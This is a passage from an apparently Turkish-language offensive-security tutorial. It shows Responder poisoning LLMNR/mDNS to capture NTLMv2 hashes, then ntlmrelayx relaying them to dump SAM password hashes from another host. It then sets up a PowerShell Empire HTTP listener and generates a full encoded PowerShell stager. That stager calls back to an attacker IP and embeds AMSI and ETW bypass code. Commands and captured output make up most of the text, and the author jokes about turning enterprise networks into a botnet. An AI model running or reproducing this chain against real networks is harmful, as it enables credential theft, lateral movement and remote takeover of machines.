[SMB] NTLMv2-SSP Hash     : dumbass::OFFENSIVE:3ffae151253ea497:65FF9436191E421FC60B3C151D3FE54F:0101000000000000002A978EEEB3D9018F84B842A97123910000000002000800500050005800540001001E00570049004E002D0032003100350042004C0050005400530034004200510004003400570049004E002D0032003100350042004C00500054005300340042005100123123004C004F00430041004C000300140050005000580054002E004C004F00430041004C000500140050005000580054002E004C004F00430041004C0007000800002A978EEEB3D90106000400020000000800300030012312300000000200000F2B72D771231236DE6792EAD5123123123000000000000000900220063006900660073002F006200650064006100760061005F00790065006D0065006B000000000000000000                                                                                                                                                                                                                       
[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f
[SMB] NTLMv2-SSP Username : OFFENSIVE\dumbass
[SMB] NTLMv2-SSP Hash     : dumbass::OFFENSIVE:33c72f25e8bfbcd9:2F7C59697E2F39834B383836A4454897:0101000000000000002A978E1231234002E004C004F00430041004C000300140050005001231230050005000580054002E004C004F00430041004C0007000800002A978EEEB3D90106000400020000000800300030000000000000000000000000200000F2B72D7754D1AB61BA316B16DE6792EAD59F2D7230194803B270538AD6CCE5D80A001000000000000000000000000000001231230660073002F006200650064006100760061005F00712312306B000000000000000000
</span></pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/11.png" class="popup img-link dark w-40 shadow rounded-10 shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1400 1200'%3E%3C/svg%3E" data-src="/assets/11.png" alt="dark mode only"  width="1400" height="1200" class="lazyload" data-proofer-ignore></a></p>
<blockquote>
  <p>Yemeği arkaplanda mDNS üzerinden bu şekilde arıyor.</p>
</blockquote>

<p>Responder bedava_yemek aramasına mDNS üzerinden yanıt verdiği için kurban tarafından istediği yere ulaşması için giriş yapması için yanıt göndermiştir. Kurban yanıtı bu şekilde görüntüler
<a href="/assets/12.png" class="popup img-link dark w-40 shadow rounded-10 shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1400 1200'%3E%3C/svg%3E" data-src="/assets/12.png" alt="dark mode only"  width="1400" height="1200" class="lazyload" data-proofer-ignore></a></p>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="go">[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f
[SMB] NTLMv2-SSP Username : OFFENSIVE\buraya_parola_girecek_kadar_safim
[SMB] NTLMv2-SSP Hash     : buraya_parola_girecek_kadar_safim::OFFENSIVE:09d512312305000580054002E004C004F00430041004C0007123123220063006900660073002F006200650064001123123005F00790065006D0065006B000000000000000000
</span></pre></td></tr></tbody></table></code></div></div>
<blockquote>
  <p>Olur da, görseldeki ekrana veri girilirse responder bunu da yakalar ancak burada bir sorun var.</p>
</blockquote>

<ul>
  <li>Bu girilen user ve parolalar doğru mu ? Diyelim bunları kırmak istiyoruz oturup normal bir hashin kırılması bile tamamen wordliste dayalıyken test esnasında bunun doğru olmadığı anlarda ne yapacağız ? RELAY RELAY RELAY</li>
</ul>

<p>Responder ayarları yapılır</p>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span><span class="nb">sudo sed</span> <span class="nt">-i</span> <span class="s1">'s/SMB = On/SMB = Off/g'</span> /etc/responder/Responder.conf                                                                                          
</pre></td></tr></tbody></table></code></div></div>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span><span class="nb">sudo sed</span> <span class="nt">-i</span> <span class="s1">'s/HTTP = On/HTTP = Off/g'</span> /etc/responder/Responder.conf
</pre></td></tr></tbody></table></code></div></div>
<blockquote class="prompt-tip">
  <p>SMB relay yapabilmek için responderın SMB ve HTTP servislerini kapatıyoruz. Bu iki servisi ntlmrelayx ile açacağız. Çünkü relay yapabilmemiz için ntlmv2 hash elde edilmesi gerekiyor ve bu hashleri de ntlmrelayx altında smbserver ile yapacağız. (ntlmrelayx bunu otomatik yapıyor)</p>
</blockquote>
<blockquote>
  <p>Responder tekrar çalıştırılır.</p>
</blockquote>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span>ntlmrelayx.py <span class="nt">-t</span> smb://192.168.1.27 <span class="nt">-smb2support</span> 
<span class="go">Impacket v0.10.1.dev1+20230629.121115.b5dab2df - Copyright 2022 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.1.27, attacking target smb://192.168.1.27
[-] Authenticating against smb://192.168.1.27 as OFFENSIVE/BURAYA_PAROLA_GIRECEK_KADAR_SAFIM FAILED
</span></pre></td></tr></tbody></table></code></div></div>
<blockquote>
  <p>Relay ile girilen credentialların doğruluğu da kontrol edebiliyoruz</p>
</blockquote>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span>ntlmrelayx.py <span class="nt">-smb2support</span> <span class="nt">-tf</span> relaylist
<span class="go">Impacket v0.10.1.dev1+20230629.121115.b5dab2df - Copyright 2022 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-6 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, attacking target smb://192.168.1.27
[-] Authenticating against smb://192.168.1.27 as OFFENSIVE/HELLO FAILED
[*] SMBD-Thread-7 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, attacking target smb://192.168.1.37
[*] Authenticating against smb://192.168.1.37 as OFFENSIVE/HELLO SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, attacking target smb://192.168.1.27
[-] Authenticating against smb://192.168.1.27 as OFFENSIVE/HELLO FAILED
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] SMBD-Thread-9 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, but there are no more targets left!
[*] Target system bootKey: 0xcdf0b6b8e765491dbd53783671b07c09
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe123452931b73c59d25234289c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c23d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16a12342552159d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b123422f365125123123cf7e67dfe92600:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:afb74ae1912342a02512316d77f55:::
user:1001:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee71232145eba56341231546ad6:::
[*] Done dumping SAM hashes for host: 192.168.1.37
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
[*] SMBD-Thread-10 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, but there are no more targets left!
[*] SMBD-Thread-11 (process_request_thread): Connection from OFFENSIVE/HELLO@192.168.1.27 controlled, but there are no more targets left!
</span></pre></td></tr></tbody></table></code></div></div>
<blockquote>
  <p>192.168.1.27 kullanıcı verileri ile, 192.168.1.37 makinesindeki hashler dump edilir. Ama nasıl ?</p>
</blockquote>

<blockquote class="prompt-tip">
  <p>192.168.1.27 makinesinden HELLO kullanıcısından gelen ntlmv2 hash, 192.168.1.37 smb sunucusuna iletildi ve geçerli olduğu görüldü. Çünkü HELLO kullanıcısının 192.168.1.37 makinesinde oturum açma yetkisi var. ntlmrelayx ile oturum açıldı hashler ve sam databasei dump edildi.</p>
</blockquote>

<blockquote class="prompt-tip">
  <p>ntlmrelayx ile succeed olan hedeflerde komut çalıştırmak ta mümkün. Enterprise networklerde ortalığı bir anda botnet networküne çevirmek için empire dostumuz.</p>
</blockquote>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span>powershell-empire server
<span class="gp">[INFO]: csharpserver: [*] Starting Empire C#</span><span class="w"> </span>server 
<span class="go">[INFO]: Plugin csharpserver ran successfully! 
[INFO]: Compiler ready 
[INFO]: Empire starting up... 
[INFO]: Starkiller served at http://localhost:1337/index.html 
[INFO]: Started server process [287903] 
[INFO]: Waiting for application startup. 
[INFO]: Application startup complete. 
[INFO]: Uvicorn running on http://0.0.0.0:1337 (Press CTRL+C to quit)
</span></pre></td></tr></tbody></table></code></div></div>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span>powershell-empire client
<span class="go">========================================================================================
 [Empire] Post-Exploitation Framework
========================================================================================
 [Version] 5.4.2 | [Web] https://github.com/BC-SECURITY/Empire
========================================================================================
 [Starkiller] Web UI | [Web] https://github.com/BC-SECURITY/Starkiller
========================================================================================
 [Documentation] | [Web] https://bc-security.gitbook.io/empire-wiki/
========================================================================================

                   ███████╗███╗   ███╗██████╗ ██╗██████╗    ███████╗                                         
                   ██╔════╝████╗ ████║██╔══██╗██║██╔══██╗   ██╔════╝                                         
                   █████╗  ██╔████╔██║██████╔╝██║██████╔╝   █████╗                                          
                   ██╔══╝  ██║╚██╔╝██║██╔═══╝ ██║██╔══██╗   ██╔══╝                                          
                   ███████╗██║ ╚═╝ ██║██║     ██║██║  █████║███████╗  
                   ╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚════╝╚══════╝


              412 modules currently loaded

              0 listeners currently active

              0 agents currently active

Starkiller is now the recommended way to use Empire.
Try it out at http://localhost:1337/index.html
INFO: Connected to localhost 
</span><span class="gp">(Empire) &gt;</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
</pre></td><td class="rouge-code"><pre><span class="gp">(Empire) &gt;</span><span class="w"> </span>uselistener http
<span class="go">
 id           http                                                                  
 authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y                 
 description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST 
              approach.                                                             
 category     client_server                                                         


┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value                               │ Required │ Description                         │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Name             │ http                                │ True     │ Name for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Host             │ http://192.168.1.19                 │ True     │ Hostname/IP for staging.            │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ BindIP           │ 0.0.0.0                             │ True     │ The IP to bind to on the control    │
│                  │                                     │          │ server.                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Port             │                                     │ True     │ Port for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Launcher         │ powershell -noP -sta -w 1 -enc      │ True     │ Launcher string.                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
</span><span class="gp">│ StagingKey       │ UFX&lt;G9@)s]m|VM+H_}Rr!Iw6&amp;igkD-&gt;</span>4    │ True     │ Staging key <span class="k">for </span>initial agent       │
<span class="go">│                  │                                     │          │ negotiation.                        │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultDelay     │ 5                                   │ True     │ Agent delay/reach back interval (in │
│                  │                                     │          │ seconds).                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultJitter    │ 0.0                                 │ True     │ Jitter in agent reachback interval  │
│                  │                                     │          │ (0.0-1.0).                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultLostLimit │ 60                                  │ True     │ Number of missed checkins before    │
│                  │                                     │          │ exiting                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultProfile   │ /admin/get.php,/news.php,/login/pro │ True     │ Default communication profile for   │
│                  │ cess.php|Mozilla/5.0 (Windows NT    │          │ the agent.                          │
</span><span class="gp">│                  │ 6.1;</span><span class="w"> </span>WOW64<span class="p">;</span> Trident/7.0<span class="p">;</span> rv:11.0<span class="o">)</span>   │          │                                     │
<span class="go">│                  │ like Gecko                          │          │                                     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ CertPath         │                                     │ False    │ Certificate path for https          │
│                  │                                     │          │ listeners.                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ KillDate         │                                     │ False    │ Date for the listener to exit       │
│                  │                                     │          │ (MM/dd/yyyy).                       │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ WorkingHours     │                                     │ False    │ Hours for the agent to operate      │
│                  │                                     │          │ (09:00-17:00).                      │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Headers          │ Server:Microsoft-IIS/7.5            │ True     │ Headers for the control server.     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Cookie           │ CLINMVkwtDrHQM                      │ False    │ Custom Cookie Name                  │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagerURI        │                                     │ False    │ URI for the stager. Must use        │
│                  │                                     │          │ /download/. Example:                │
│                  │                                     │          │ /download/stager.php                │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default                             │ False    │ User-agent string to use for the    │
│                  │                                     │          │ staging request (default, none, or  │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default                             │ False    │ Proxy to use for request (default,  │
│                  │                                     │          │ none, or other).                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default                             │ False    │ Proxy credentials                   │
│                  │                                     │          │ ([domain\]username:password) to use │
│                  │                                     │          │ for request (default, none, or      │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ SlackURL         │                                     │ False    │ Your Slack Incoming Webhook URL to  │
│                  │                                     │          │ communicate with your Slack         │
│                  │                                     │          │ instance.                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ JA3_Evasion      │ False                               │ True     │ Randomly generate a JA3/S signature │
│                  │                                     │          │ using TLS ciphers.                  │
└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘
</span><span class="gp">(Empire: uselistener/http) &gt;</span><span class="w"> </span><span class="nb">set </span>Name pwnypwny
<span class="go">INFO: Set Name to pwnypwny 
</span><span class="gp">(Empire: uselistener/http) &gt;</span><span class="w"> </span><span class="nb">set </span>Host 192.168.1.19
<span class="go">INFO: Set Host to 192.168.1.19 
</span><span class="gp">(Empire: uselistener/http) &gt;</span><span class="w"> </span><span class="nb">set </span>Port 9999
<span class="go">INFO: Set Port to 9999 
</span><span class="gp">(Empire: uselistener/http) &gt;</span><span class="w"> </span>execute
<span class="go">[+] Listener pwnypwny successfully started
</span><span class="gp">(Empire: uselistener/http) &gt;</span><span class="w"> </span>back
<span class="gp">(Empire) &gt;</span><span class="w"> </span>usestager multi_launcher
<span class="go">
 id           multi_launcher                                        
 authors      Will Schroeder, @harmj0y, https://twitter.com/harmj0y 
 description  Generates a one-liner stage0 launcher for Empire.     


┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value              │ Required │ Description                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Listener         │                    │ True     │ Listener to generate stager for.    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Language         │ powershell         │ True     │ Language of the stager to generate. │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ StagerRetries    │ 0                  │ False    │ Times for the stager to retry       │
│                  │                    │          │ connecting.                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ OutFile          │                    │ False    │ Filename that should be used for    │
│                  │                    │          │ the generated output.               │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Base64           │ True               │ True     │ Switch. Base64 encode the output.   │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
│                  │                    │          │ powershell code, uses the           │
│                  │                    │          │ ObfuscateCommand for obfuscation    │
│                  │                    │          │ types. For powershell only.         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ObfuscateCommand │ Token\All\1        │ False    │ The Invoke-Obfuscation command to   │
│                  │                    │          │ use. Only used if Obfuscate switch  │
│                  │                    │          │ is True. For powershell only.       │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ SafeChecks       │ True               │ True     │ Switch. Checks for LittleSnitch or  │
│                  │                    │          │ a SandBox, exit the staging process │
│                  │                    │          │ if true. Defaults to True.          │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default            │ False    │ User-agent string to use for the    │
│                  │                    │          │ staging request (default, none, or  │
│                  │                    │          │ other).                             │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default            │ False    │ Proxy to use for request (default,  │
│                  │                    │          │ none, or other).                    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
│                  │                    │          │ ([domain\]username:password) to use │
│                  │                    │          │ for request (default, none, or      │
│                  │                    │          │ other).                             │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
│                  │                    │          │ to be prepended to the launcher     │
└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘

</span><span class="gp">(Empire: usestager/multi_launcher) &gt;</span><span class="w"> </span><span class="nb">set </span>Listener pwnypwny
<span class="go">INFO: Set Listener to pwnypwny 
</span><span class="gp">(Empire: usestager/multi_launcher) &gt;</span><span class="w"> </span>execute
<span class="go">powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB1AEEARABFAEEATwBRAEEANgBBAEQAawBBAE8AUQBBADUAQQBEAGsAQQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAFUARgBYADwARwA5AEAAKQBzAF0AbQB8AFYATQArAEgAXwB9AFIAcgAhAEkAdwA2ACYAaQBnAGsARAAtAD4ANAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsA